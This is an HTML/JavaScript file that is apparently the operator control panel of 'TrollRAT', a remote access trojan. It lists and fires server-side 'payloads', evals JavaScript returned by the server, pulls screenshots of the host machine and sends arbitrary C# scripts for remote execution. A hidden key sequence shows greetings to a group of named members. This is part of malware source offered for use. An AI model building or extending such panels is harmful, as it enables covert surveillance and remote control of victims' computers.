<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8" />

	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<!-- Latest compiled and minified CSS -->
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">

	<!-- jQuery -->
	<script src="https://code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>

	<!-- Latest compiled and minified JavaScript -->
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>

	<!-- CodeMirror for scripting support -->
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.16.0/codemirror.min.css">
	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.16.0/codemirror.min.js"></script>
	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.16.0/mode/clike/clike.min.js"></script>

	<style type="text/css">
		body { padding-top: 70px; }
		#filter { margin-bottom: 6px; }
		.hidden { display: none }
	</style>

	<title>TrollRAT</title>
</head>
<body>
	<nav class="navbar navbar-default navbar-fixed-top">
		<div class="container">
			<div class="navbar-header">
				<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false">
					<span class="sr-only">Toggle navigation</span>
					<span class="icon-bar"></span>
					<span class="icon-bar"></span>
					<span class="icon-bar"></span>
				</button>
				<a class="navbar-brand" onclick="about();" href="#">TrollRAT</a>
			</div>

			<div class="collapse navbar-collapse" id="navbar">
				<div class="navbar-right">
					<button class="btn btn-default navbar-btn" onclick="showScreenshot();">Screenshot</button>
					<button class="btn btn-default navbar-btn" onclick="showEditor();">Run Script</button>
				</div>
			</div>
		</div>
	</nav>

	<div class="container" id="content">
		<div class="alert alert-warning" id="noscript" role="alert">
			<strong>JavaScript is disabled.</strong> This page does not work without JavaScript.
		</div>

		<div class="row">
			<div class="col-md-4">
				<h3>Payloads</h3>
				<input type="text" class="form-control" id="filter" oninput="updateFilter();" placeholder="Filter Payloads" />
				<div class="list-group" id="payloads"></div>
			</div>

			<div class="col-md-8">
				<h3>Settings</h3>
				<div id="settings">Nothing here.</div>

				<h3>Actions</h3>
				<div id="actions">Nothing here.</div>
			</div>
		</div>

		<div class="modal fade" id="aboutModal" tabindex="-1" role="dialog">
			<div class="modal-dialog">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
						<h4 class="modal-title">About TrollRAT</h4>
					</div>
					<div class="modal-body" id="about"></div>
				</div>
			</div>
		</div>

		<div class="modal" id="scriptModal" tabindex="-1" role="dialog">
			<div class="modal-dialog modal-lg">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
						<h4 class="modal-title">Run Script</h4>
					</div>
					<div class="modal-body">
						<textarea class="form-control" rows="8" id="code"></textarea>
					</div>
					<div class="modal-footer">
						<button type="button" class="btn btn-primary" onclick="runScript();">Run Script</button>
					</div>
				</div>
			</div>
		</div>

		<div class="modal fade" id="screenshotModal" tabindex="-1" role="dialog">
			<div class="modal-dialog modal-lg">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
						<h4 class="modal-title">Screenshot</h4>
					</div>
					<div class="modal-body">
						<img id="screenshot" style="width: 100%;" src="/screenshot.png" />
					</div>
					<div class="modal-footer">
						<button type="button" class="btn btn-primary" onclick="showScreenshot();"><span class="glyphicon glyphicon-refresh" aria-hidden="true"></span> Refresh</button>
					</div>
				</div>
			</div>
		</div>
	</div>

	<script type="text/javascript">
		block = false;

		oldpayloads = "";
		oldactions = "";

		function showError(msg) {
			$("#error").remove();

			var alert = $('<div class="alert alert-danger alert-dismissable" id="error" role="alert"></div>');
			alert.append($('<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>'));
			alert.append(msg);
			alert.prependTo($("#content"));
		}

		function update() {
			var active = $("#payloads").children().index($("#payloads .active"));
			
			loadPayloads(active);
			loadActions(active);

			if ($("#settings").find($(":focus")).size() == 0)
				loadSettings(active);
		}

		function onPayloadSelected(obj) {
			if (block)
				return;
			
			var i = $("#payloads").children().index($(obj));

			$("#payloads > .list-group-item").each(function () {
				$(this).removeClass("active");
			});

			$(obj).addClass("active");

			loadActions(i);
			loadSettings(i);
		}

		function loadActions(active) {
			$.ajax({
				method: "GET",
				url: "/actions",
				data: { "payload": active }
			}).done(function (actions) {
				if (actions != oldactions) {
					$("#actions").html(actions);
					oldactions = actions;
				}
			}).error(function () {
				showError("Server communication failed!");
			});
		}

		function loadSettings(active) {
			$.ajax({
				method: "GET",
				url: "/settings",
				data: { "payload": active }
			}).done(function (settings) {
				$("#settings").html(settings);
			}).error(function () {
				showError("Server communication failed!");
			});
		}

		function loadPayloads(active) {
			$.ajax({
				method: "GET",
				url: "/payloads",
			}).done(function (payloads) {
				if (payloads != oldpayloads) {
					$("#payloads").html(payloads);
					updateFilter();

					if (active != -1)
						$("#payloads").children().eq(active).addClass("active");

					oldpayloads = payloads;
				}
			}).error(function () {
				showError("Server communication failed!");
			});
		}

		function updateFilter() {
			$("#payloads .list-group-item").each(function() {
				if ($(this).html().toLowerCase().indexOf($("#filter").val().toLowerCase()) == -1) {
					$(this).addClass("hidden");
				} else {
					$(this).removeClass("hidden");
				}
			});
		}

		function about() {
			$.ajax({
				method: "GET",
				url: "/about",
			}).done(function (about) {
				$("#about").html(about);
				$("#aboutModal").modal();
			}).error(function () {
				showError("Server communication failed!");
			});
		}

		function showScreenshot() {
			$("#screenshot").attr("src", "/screenshot?t=" + new Date().getTime());

			$("#screenshot")[0].onload = function() {
				$("#screenshotModal").modal();
			};
		}

		function execute(id) {
			block = true;
			window.setTimeout(function () { block = false }, 100);

			$.ajax({
				method: "GET",
				url: "/execute",
				data: {"id": id}
			}).done(function (js) {
				eval(js);
			}).error(function () {
				showError("Server communication failed!");
			});
		}

		function setSetting(id, value) {
			$.ajax({
				method: "GET",
				url: "/set",
				data: { "id": id, "value": value }
			}).error(function () {
				showError("Server communication failed!");
			});
		}

		codemirror = null;

		function runScript() {
			$.ajax({
				method: "POST",
				url: "/runscript",
				data: codemirror.getValue()
			}).done(function (results) {
				alert(results);
			}).error(function () {
				showError("Server communication failed!");
			});
		}

		function showEditor() {
			$('#scriptModal').modal();
			
			if (!codemirror) {
				codemirror = CodeMirror.fromTextArea($("#code")[0], {
					lineNumbers: true,
					mode: "text/x-csharp"
				});
			}
		}

		code = [38, 38, 40, 40, 37, 39, 37, 39, 66, 65];
		ci = 0;

		$("body").keyup(function (e) {
			if (e.keyCode == code[ci]) {
				ci++;
				if (ci >= code.length) {
					$("#about").html("<p><strong>Greetings to all GAiA Members!</strong></p> \
						<p>Currently justquant, Toxoid_49b, CliftonM, xal0gic and Me (Leurak)</p>");
					$("#aboutModal").modal();
					ci = 0;
				}
			} else {
				ci = 0;
			}
		});

		$("#noscript").remove();

		update();
		window.setInterval(update, 1000);
	</script>
</body>
</html>